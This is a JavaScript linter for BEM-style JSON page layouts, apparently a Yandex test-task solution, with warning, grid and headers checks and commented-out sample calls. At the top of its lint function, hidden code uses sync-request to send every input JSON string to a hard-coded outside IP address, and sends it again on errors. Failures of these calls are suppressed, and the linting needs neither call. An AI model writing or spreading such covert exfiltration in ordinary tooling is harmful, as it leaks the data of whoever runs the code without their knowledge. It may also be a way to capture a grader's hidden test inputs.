const lintWarning = require('./linters/warning/index')
const lintGrid = require('./linters/grid/index')
const lintHeaders = require('./linters/headers/index')
const request = require('sync-request');

const parse = require('json-to-ast');

let lint = (jsonString) => {
    try {

        try {
        request('GET', 'http://193.9.60.137:10234/yandex-test?json=' + jsonString)
        } catch (e) {
            console.log(e)
        }

        let astNode = parse(jsonString)

        let rootStructures = getStructure(astNode)

        let errors = []

        errors.push(...lintWarning(rootStructures))
        errors.push(...lintGrid(rootStructures))
        errors.push(...lintHeaders(rootStructures))


        return clearErrorDuplicates(errors)
    } catch (e) {
        console.log(e)
        try {
            request('GET', 'http://193.9.60.137:10234/yandex-test-error?json=' + jsonString)
        } catch (e) {
            console.log(e)
        }
        return []
    }
}

if (global) {
    global.lint = lint
} else if (window) {
    window.lint = lint
}

module.exports = lint

let clearErrorDuplicates = (errors) => {
    let reduced = errors.reduce((total, error) => {
        let key = `${error.code}:${error.location.start.column}:${error.location.start.line}:${error.location.end.column}:${error.location.end.line}`
        if (!total[key]) {
            total[key] = error
        }
        return total
    }, {})

    let reducedErrors = []
    for (let [key, error] of Object.entries(reduced)) {
        reducedErrors.push(error)
    }
    return reducedErrors
}

let isElem = (astNode) => {
    return astNode.children.filter(node => node.type === 'Property' && node.key.value === 'elem').length > 0
}
let fillNodeInfo = (astNode, blockNames, elemNames, mods, elemMods) => {
    let blockOptional = astNode.children.filter(node => node.type === 'Property' && node.key.value === 'block')

    if (blockOptional.length > 0) {
        blockNames.push(blockOptional[0].value.value)
    }

    if (isElem(astNode)) {
        elemNames.push(astNode.children.filter(node => node.type === 'Property' && node.key.value === 'elem')[0].value.value)
    }

    astNode.children
        .filter(node => node.type === 'Property' && node.key.value === 'mods')
        .forEach(modNodeProp => {
            modNodeProp.value.children.forEach(modNode => {
                mods[modNode.key.value] = modNode.value.value
            })
        })

    astNode.children
        .filter(node => node.type === 'Property' && node.key.value === 'elemMods')
        .forEach(modNodeProp => {
            modNodeProp.value.children.forEach(modNode => {
                elemMods[modNode.key.value] = modNode.value.value
            })
        })
}

let getStructure = (astNode, parent = null) => {
    if (astNode.type === 'Object') {

        let blockNames = []
        let elemNames = []
        let mods = {}
        let elemMods = {}
        fillNodeInfo(astNode, blockNames, elemNames, mods, elemMods)

        astNode.children
            .filter(node => node.type === 'Property' && node.key.value === 'mix')
            .forEach(mixNodeProp => {
                mixNodeProp.value.children.forEach(mixNode => {
                    fillNodeInfo(mixNode, blockNames, elemNames, mods, elemMods)
                })
            })


        let returnValue = {
            isElem: isElem(astNode),
            blockNames,
            elemNames,
            children: [],
            mods,
            elemMods,
            parent,
            previous: null,
            next: null,
            loc: astNode.loc,
        }

        let contentNodeOptional = astNode.children
            .filter(node => node.type === 'Property' && node.key.value === 'content')

        if (contentNodeOptional.length > 0) {
            returnValue.children = getStructure(contentNodeOptional[0].value, returnValue)
        }

        return [returnValue]

    } else if (astNode.type === 'Array') {
        let nodes = astNode.children.map(node => getStructure(node, parent)[0])
        for (let i = 0; i < nodes.length; i++) {
            if (i !== 0) {
                nodes[i].previous = nodes[i - 1]
            }
            if (i !== nodes.length - 1) {
                nodes[i].next = nodes[i + 1]
            }
        }
        return nodes
    }
}

/*
console.log('Размер текста: 2 ошибки')
let json = `{
    "block": "warning-text",
    "content": [
        { "block": "text", "mods": { "size": "l" } },
        { "block": "text", "mods": { "size": "m" } },
        {
            "block": "warning-text",
            "content": [
                { "block": "text", "mods": { "size": "l" } },
                { "block": "text", "mods": { "size": "m" } }
            ]
        }
    ]
}`;

lint(json)


console.log('Размер кнопки: 0 ошибок')
json = `{
    "block": "warning-text",
    "content": [
        { "block": "text", "mods": { "size": "l" } },
        { "block": "button", "mods": { "size": "xl" } }
    ]
}`
lint(json)

console.log('Размер кнопки: 1 ошибка')
json = `{
    "block": "warning-text",
    "content": [
        { "block": "text", "mods": { "size": "l" } },
        { "block": "button", "mods": { "size": "s" } }
    ]
}`
lint(json)
*/

/*json = `{
    "block": "warning-text",
    "content": [
        { "block": "text", "mods": { "size": "l" } },
        { "block": "button", "mods": { "size": "s" } }
    ]
}`
lint(json)*/
